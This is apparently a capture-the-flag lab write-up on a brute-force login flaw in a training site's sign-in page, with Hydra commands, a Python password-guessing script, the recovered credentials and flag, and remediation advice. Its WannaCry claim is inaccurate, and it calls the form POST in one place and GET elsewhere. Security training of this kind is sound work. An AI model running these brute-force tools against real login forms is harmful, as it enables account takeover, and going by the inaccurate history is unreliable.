# Brute Force Sign-In

## Breach Type
**Identification and Authentication Failures / Brute Force** — OWASP Top 10: A07:2021 Identification and Authentication Failures

## What is this Vulnerability?
**Brute Force** is an attack where the attacker systematically tries a large number of possible passwords on a login form until the correct one is found. It works when the application has **no protection** against repeated failed login attempts — no rate limiting, no account lockout, and no CAPTCHA.

In simple terms: a normal lock gets harder to pick the more times you fail (alarms go off, the lock jams). A login form without brute force protection is like a lock you can try to open **millions of times per second** with no consequences — so an attacker just runs through a wordlist of common passwords until one works.

The login form at `?page=signin` accepts `username` and `password` via a POST request. There is nothing stopping an automated tool from sending thousands of requests with different passwords. The username `admin` is a standard guess. The password `shadow` appears in every standard password dictionary (it's #88 in the rockyou.txt wordlist with over 14 million entries).

### Why is it dangerous?
- **No defense needed beyond a wordlist**: Common passwords are cracked in seconds
- **Fully automated**: Tools like Hydra can try thousands of passwords per minute
- **Silent attack**: Without monitoring, the server logs thousands of failed attempts with no alerts
- **Escalates to full compromise**: Once an admin account is cracked, the attacker owns everything
- **Password reuse**: Found credentials are often valid on other platforms (email, SSH, databases)

### Real-world impact
In 2016, over 100 GitHub accounts were compromised by brute force using passwords leaked from other breaches. In 2017, the WannaCry ransomware spread partly by brute-forcing Windows SMB credentials. An estimated 5% of all data breaches involve brute force attacks.

## Where
URL: `http://<IP>/?page=signin` — The Sign In form (username + password GET form)

## How I Found It
1. Navigated to `?page=signin` — the main login form.
2. Tried a few common credentials manually (`admin/admin`, `admin/password`, `admin/123456`) — all failed with "Wrong answer" but **no lockout occurred**.
3. This confirmed the form has **no brute force protection** — I can try as many passwords as I want.
4. Knowing the username is likely `admin`, I ran a dictionary attack with a short list of common passwords.
5. `admin` / `shadow` succeeded.

> **Note:** The page parameter `Member_Brute_Force` visible via SQL injection on `?page=member` confirms this is the intended brute force target — but SQL injection is a separate breach. The brute force attack on the login form works entirely independently.

## Step-by-Step Exploitation

### Step 1: Confirm No Lockout Protection
Try wrong passwords multiple times and observe the server keeps responding normally (no delay, no lockout, no CAPTCHA):
```bash
curl -s "http://<IP>/?page=signin&username=admin&password=wrongpass&Login=Login" | grep -i "wrong\|invalid\|locked"
# Returns WrongAnswer.gif every time — no lockout, no slowdown
```

### Step 2: Brute Force with Hydra
> **Important:** The form uses `method="GET"`. The path must be `/` with all parameters in the params field. `F=WrongAnswer.gif` tells hydra that if the response contains `WrongAnswer.gif`, the attempt **failed** — that image only appears on wrong password attempts.
```bash
# With your own wordlist
hydra -V -l admin -P passwords.txt localhost -s 8080 -t 1 http-get-form "/:page=signin&username=^USER^&password=^PASS^&Login=Login:F=WrongAnswer.gif"

# With rockyou.txt
hydra -V -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8080 -t 1 http-get-form "/:page=signin&username=^USER^&password=^PASS^&Login=Login:F=WrongAnswer.gif"
```
Hydra will print every attempt (`-V`) and stop when it finds the one that does NOT return `WrongAnswer.gif`:
```
[ATTEMPT] target localhost - login "admin" - pass "admin" - 1 of 16
[ATTEMPT] target localhost - login "admin" - pass "password" - 2 of 16
...
[8080][http-get-form] host: localhost   login: admin   password: shadow
```
> Note: `-t 1` (single thread) is required — sending concurrent GET requests to this server causes unreliable responses.

### Step 3: Brute Force with Python Script
If hydra is not available, a simple Python script does the same:
```python
import requests

url = "http://<IP>/?page=signin"
username = "admin"

# Common password wordlist
passwords = [
    "admin", "password", "123456", "root", "toor", "pass",
    "shadow", "master", "letmein", "qwerty", "abc123",
    "welcome", "monkey", "dragon", "sunshine", "princess"
]

for pwd in passwords:
    r = requests.get(url, params={
        "username": username,
        "password": pwd,
        "Login": "Login"
    })
    if "flag" in r.text.lower():
        print(f"[+] Found password: {pwd}")
        break
    else:
        print(f"[-] {pwd} — failed")
```
Output:
```
[-] admin — failed
[-] password — failed
...
[+] Found password: shadow
The flag is b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

### Step 4: Login with Found Credentials
```bash
curl -s "http://<IP>/?page=signin&username=admin&password=shadow&Login=Login" | grep -i flag
```
Output:
```
The flag is b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

## Flag
```
b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

## How to Test Manually
1. Open `http://<IP>/?page=signin` in your browser
2. Try `admin` / `admin` → "Wrong answer" — but notice: no lockout, no CAPTCHA
3. Try `admin` / `password` → wrong again, still no lockout
4. Try `admin` / `shadow` → flag appears

**Or run the Python script above** — it will automatically cycle through passwords and stop when `shadow` succeeds.

**Using hydra** (if installed):
```bash
hydra -V -l admin -P passwords.txt localhost -s 8080 -t 1 http-get-form "/:page=signin&username=^USER^&password=^PASS^&Login=Login:F=WrongAnswer.gif"
```

## How to Fix
- **Implement account lockout**: Lock the account for 15 minutes after 5 failed attempts
- **Add rate limiting**: Maximum N requests per IP per minute on the login endpoint
- **Add CAPTCHA**: Force human verification after 3 failed attempts
- **Use strong passwords**: `shadow` is in every dictionary — enforce minimum complexity
- **Hash passwords with bcrypt/argon2**, not MD5 or plain text:
  ```php
  $hash = password_hash($password, PASSWORD_BCRYPT);
  if (!password_verify($input, $hash)) { /* fail */ }
  ```
- **Monitor and alert**: Log all failed login attempts; alert on anomalies (>10 failures/minute from same IP)
- **Use multi-factor authentication (MFA)**: Even if the password is found, MFA blocks access

## OWASP Reference
- [Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
- [Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
